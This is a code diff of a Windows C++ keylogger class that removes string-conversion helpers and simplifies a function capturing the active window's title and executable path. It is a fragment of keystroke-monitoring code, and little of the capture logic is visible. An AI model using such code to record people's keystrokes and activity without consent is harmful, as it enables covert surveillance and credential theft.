@@ -14,7 +14,6 @@
 #include <shlwapi.h>
 #include <libloaderapi.h>
 #pragma comment(lib, "psapi.lib")
-
 /*
 * Return the current pressed key or null
 */
@@ -136,20 +135,6 @@ class KeyLogger {
         KeyLogger::Start([](char c){}, callback);
     }
 };
-std::wstring s2ws(const std::string& str)
-{
-    using convert_typeX = std::codecvt_utf8<wchar_t>;
-    std::wstring_convert<convert_typeX, wchar_t> converterX;
-
-    return converterX.from_bytes(str);
-}
-
-std::string ws2s(const std::wstring& wstr)
-{
-    using convert_typeX = std::codecvt_utf8<wchar_t>;
-    std::wstring_convert<convert_typeX, wchar_t> converterX;
-    return converterX.to_bytes(wstr);
-}
 /*
 * Return the current pressed key or null
 */
@@ -158,46 +143,15 @@ std::string GetActiveWindowTitle()
     //LPSTR wnd_title;
     char wnd_title[256];
     char wnd_path[256];
-    HWND hwnd = GetForegroundWindow(); // get handle of currently active window
+    // get handle of currently active window
+    HWND hwnd = GetForegroundWindow();
+    // get title text of currently active window
     GetWindowTextA(hwnd, wnd_title, sizeof(wnd_title));
-    // GetWindowModuleFileNameA(hwnd, wnd_path, sizeof(wnd_path));
-
-    //GetWindowModule(hwnd);
-
-    std::string name = wnd_title;
-    //std::string path = wnd_path;
-
-    TCHAR buffer[MAX_PATH] = { 0 };
-    DWORD dwProcId = 0;
-    GetWindowThreadProcessId(hwnd, &dwProcId);
-    HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, dwProcId);
-    GetModuleFileName((HMODULE)hProc, buffer, MAX_PATH);
-    CloseHandle(hProc);
-    std::wstring wpath = buffer;
-    std::string path = ws2s(wpath);
-
-    // get process Id of the active window
-
-    /*LPDWORD lpdwProcessId = NULL;
-    DWORD pid = GetWindowThreadProcessId(hwnd, lpdwProcessId);*/
-
-    /*HANDLE processHandle = NULL;
-    TCHAR filename[MAX_PATH];
-    processHandle = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
-    if (processHandle) {
-        if (GetModuleFileNameEx(processHandle, NULL, filename, MAX_PATH))
-            std::cout << "Module filename is: " << filename << std::endl;
-        else
-            std::cout << "Error retrieving path" << std::endl;
-        CloseHandle(processHandle);
-    }
-    else std::cout << "Failed to open process." << std::endl;*/
-
-    /*HANDLE h = GetProcessHandleFromHwnd(hwnd);
-    int pid = GetWindowProcessID(hwnd);
-    Process p = Process.GetProcessById(pid);*/
-    //string appName = p.ProcessName;
-    return name;
+    // get exe path of currently active window
+    GetWindowModuleFileNameA(hwnd, wnd_path, sizeof(wnd_path));
+    std::string title = wnd_title;
+    std::string path = wnd_path;
+    return title;
 }
 /// <summary>
 /// 
